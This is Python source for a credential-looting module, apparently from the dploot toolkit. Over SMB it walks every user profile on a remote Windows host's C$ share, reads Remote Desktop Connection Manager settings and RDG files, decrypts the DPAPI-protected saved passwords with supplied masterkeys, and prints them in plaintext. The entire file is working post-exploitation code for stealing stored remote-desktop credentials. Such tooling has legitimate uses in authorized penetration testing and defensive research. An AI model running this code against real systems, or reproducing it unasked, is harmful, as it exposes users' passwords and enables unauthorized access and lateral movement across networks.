import logging
import ntpath
from typing import List
import xml.etree.ElementTree as ET
import base64

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target

class RDGTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_rdcman_settings_generic_filepath = 'Users\\%s\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings'
    user_rdg_generic_filepath = ['Users\\%s\\Documents','Users\\%s\\Desktop']
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_rdcman(self) -> None:
        logging.info('Triage RDCMAN Settings and RDG files for ALL USERS')
        print()
        for user in self.users:
            try:
                self.triage_rdcman_for_user(user)
            except Exception as e:
                print(str(e))
                pass
        print()

    def triage_rdcman_for_user(self, user: str) -> None:
        try:
            user_rcdman_settings_filepath = self.user_rdcman_settings_generic_filepath % user
            rdcmanblob_bytes = self.conn.readFile(self.share,user_rcdman_settings_filepath)
            if rdcmanblob_bytes:
                logging.info("Found RDCMan Settings for %s user" %  (user))
                print("RDCMAN File: \\\\%s\\%s\\%s" %  (self.target.address,self.share,user_rcdman_settings_filepath))
                # read credman blob 
                if rdcmanblob_bytes is not None and self.masterkeys is not None:
                    self.looted_files['%s_RDCMan.settings' % user] = rdcmanblob_bytes
                    xml_data = rdcmanblob_bytes
                    root = ET.fromstring(xml_data)
                    self.triage_rdcman_settings(root)
                    rdgfiles = root.find('.//FilesToOpen')
                    for item in rdgfiles.findall('.//item'):
                        filename = item.text
                        if '\\\\' in filename:
                            # check if it is unc path
                            print('unc path for %s' % filename)
                        else:
                            logging.info("Found RDG file: %s" % filename)
                            if 'C:\\' in filename:
                                filepath = filename.replace('C:\\','')
                                rdg_bytes = self.conn.readFile(self.share, filepath)
                                rdg_xml = ET.fromstring(rdg_bytes)
                                self.triage_rdgprofile(rdg_xml)

                    
            # ajouter le triage des fichiers rdg
        except Exception as e:
            print(str(e))
            pass

    def triage_rdgprofile(self, rdgxml: ET.Element) -> None:
        for cred_profile in rdgxml.findall('.//credentialsProfile'):
            if cred_profile is not None:
                print('[CREDENTIAL PROFILES]')
                self.triage_credprofile(cred_profile)

        for server_profile in rdgxml.findall('.//server'):
            print('[SERVER PROFILES]')
            server_name = server_profile.find('.//properties//name').text
            print('\tName:\t\t%s' % server_name)
            for item in server_profile.findall('.//logonCredentials'):
                self.triage_credprofile(item)


    def triage_rdcman_settings(self, rdcman_settings : ET.Element) -> None:
        for cred_profile in rdcman_settings.findall('.//credentialsProfile'):
            if cred_profile is not None:
                print('[CREDENTIAL PROFILES]')
                self.triage_credprofile(cred_profile)

        for cred_profile in rdcman_settings.findall('.//logonCredentials'):
            if cred_profile is not None:
                print('[LOGON PROFILES]')
                self.triage_credprofile(cred_profile)

    def triage_credprofile(self, cred_node: ET.Element) -> None:
        profile_name = cred_node.find('.//profileName').text
        print('\tProfile Name:\t%s' % profile_name)
        if cred_node.find(".//userName") is None:
            return
        else:
            username = cred_node.find('.//userName').text
            domain = cred_node.find('.//domain').text
            b64password = cred_node.find('.//password').text

            full_username = password = ''

            if domain == '':
                full_username = username
            else:
                full_username = '%s\\%s' % (domain, username)

            pass_dpapi_blob = base64.b64decode(b64password)
            print('\tUsername:\t%s' % full_username)
            masterkey = find_masterkey_for_blob(pass_dpapi_blob, self.masterkeys)
            if masterkey is not None:
                password = decrypt_blob(pass_dpapi_blob, masterkey)
                print('\tPassword:\t%s' % password.decode('latin-1'))
            print()

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users